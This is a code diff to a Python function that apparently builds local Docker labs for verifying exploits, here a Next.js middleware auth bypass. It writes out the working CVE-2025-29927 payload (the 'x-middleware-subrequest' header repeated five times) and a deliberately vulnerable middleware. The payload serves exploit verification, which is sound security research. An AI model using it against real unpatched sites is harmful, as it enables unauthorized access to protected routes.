@@ -10969,11 +10969,16 @@ def _scaffold_npm_lab(target: str, version: str, vuln_class: str,
     # With the bypass header the middleware short-circuits before the auth check and
     # the protected /api/secret route becomes accessible → exploit verified.
     if _is_nextjs and vuln_class in ("missing-authorization", "auth-bypass"):
-        # middleware.js — restricts /api/secret; without bypass header request is blocked
+        # When the analyst has locked the endpoint, build the lab around THEIR endpoint
+        # and confirm_string. Otherwise use the canonical /api/secret canary.
+        _ep_lock = notes.get("analyst_endpoint_lock")
+        _target_ep = (notes.get("endpoint") or "/api/secret") if _ep_lock else "/api/secret"
+        _target_cs = (notes.get("confirm_string") or "BINORACLE_NEXTJS_MIDDLEWARE_BYPASS") if _ep_lock else "BINORACLE_NEXTJS_MIDDLEWARE_BYPASS"
+        # middleware.js — restricts _target_ep; without bypass header request is blocked
         mw_js = (
             "import { NextResponse } from 'next/server';\n"
             "export function middleware(request) {\n"
-            "  if (request.nextUrl.pathname.startsWith('/api/secret')) {\n"
+            f"  if (request.nextUrl.pathname.startsWith('{_target_ep}')) {{\n"
             "    const auth = request.headers.get('authorization');\n"
             "    if (auth !== 'Bearer admin-secret-token') {\n"
             "      return new NextResponse('Forbidden', { status: 403 });\n"
@@ -10981,19 +10986,33 @@ def _scaffold_npm_lab(target: str, version: str, vuln_class: str,
             "  }\n"
             "  return NextResponse.next();\n"
             "}\n"
-            "export const config = { matcher: ['/api/secret'] };\n"
+            f"export const config = {{ matcher: ['{_target_ep}'] }};\n"
         )
-        secret_dir = _os.path.join(lab_dir, "pages", "api")
-        _os.makedirs(secret_dir, exist_ok=True)
         with open(_os.path.join(lab_dir, "middleware.js"), "w") as f:
             f.write(mw_js)
-        # pages/api/secret.js — returns canary
-        with open(_os.path.join(secret_dir, "secret.js"), "w") as f:
-            f.write(
-                "export default function handler(req, res) {\n"
-                "  res.status(200).json({ secret: 'BINORACLE_NEXTJS_MIDDLEWARE_BYPASS' });\n"
-                "}\n"
-            )
+        # Create the protected resource at _target_ep
+        _ep_path = _target_ep.lstrip("/")
+        _ep_parts = _ep_path.split("/")
+        if _ep_path.startswith("api/"):
+            # API route: pages/api/<name>.js → returns JSON
+            _api_dir = _os.path.join(lab_dir, "pages", *_ep_parts[:-1])
+            _os.makedirs(_api_dir, exist_ok=True)
+            with open(_os.path.join(_api_dir, _ep_parts[-1] + ".js"), "w") as f:
+                f.write(
+                    "export default function handler(req, res) {\n"
+                    f"  res.status(200).json({{ secret: '{_target_cs}' }});\n"
+                    "}\n"
+                )
+        else:
+            # Page route: pages/<path>.js → returns HTML with confirm_string text
+            _page_dir = _os.path.join(lab_dir, "pages", *_ep_parts[:-1]) if len(_ep_parts) > 1 else _os.path.join(lab_dir, "pages")
+            _os.makedirs(_page_dir, exist_ok=True)
+            with open(_os.path.join(_page_dir, _ep_parts[-1] + ".js"), "w") as f:
+                f.write(
+                    f"export default function Protected() {{\n"
+                    f"  return <div>{_target_cs}</div>;\n"
+                    "}\n"
+                )
         # SWC (el transpilador nativo de Next.js) funciona correctamente bajo --platform
         # linux/amd64 en Docker incluso en M1: el contenedor corre como x86_64 Linux y los
         # binarios SWC precompilados para glibc/linux-x64 se cargan sin problemas.
@@ -11012,21 +11031,21 @@ def _scaffold_npm_lab(target: str, version: str, vuln_class: str,
             "  });\n"
             "});\n"
         )
-        # Update notes so verify_generic_header_bypass targets /api/secret and knows
-        # bypass_header; these keys are only set if not already present (LLM takes priority)
-        # Always override endpoint to /api/secret — that's where we put the canary.
-        # The LLM may have set a different endpoint (e.g. /api/middleware) which won't
-        # have the canary. The bypass_header / bypass_value have known values too.
-        notes["endpoint"] = "/api/secret"
-        notes["bypass_header"] = "x-middleware-subrequest"
+        # Update notes so verify_generic_header_bypass targets the right endpoint.
+        # When analyst has locked the endpoint/confirm_string, respect them.
+        # Otherwise point at the canonical canary path /api/secret.
+        if not _ep_lock:
+            notes["endpoint"] = "/api/secret"
+            notes["confirm_string"] = "BINORACLE_NEXTJS_MIDDLEWARE_BYPASS"
+        # bypass_header / bypass_value: use setdefault so analyst values always win
         # CVE-2025-29927: Next.js ≤15.2.3 comprueba si la profundidad de subrequests
         # supera MAX_RECURSION_DEPTH (5). Si el header contiene N>=5 copias del nombre
         # del middleware separadas por ':', el guard asume que ya se alcanzo la profundidad
         # maxima y NO ejecuta el middleware -- silenciando la proteccion de acceso.
         # El formato 'middleware:middleware:middleware:middleware:middleware' (5 copias)
         # es el payload minimal confirmado en las PoCs publicas (Watchtower, EQSTLab).
-        notes["bypass_value"] = "middleware:middleware:middleware:middleware:middleware"
-        notes["confirm_string"] = "BINORACLE_NEXTJS_MIDDLEWARE_BYPASS"
+        notes.setdefault("bypass_header", "x-middleware-subrequest")
+        notes.setdefault("bypass_value", "middleware:middleware:middleware:middleware:middleware")
         # Dockerfile: dev mode — no pre-build step needed; Next.js compiles on the
         # first request. Middleware runs in dev mode exactly as in production for the
         # auth-bypass check we care about. '-H 0.0.0.0' binds to all interfaces so
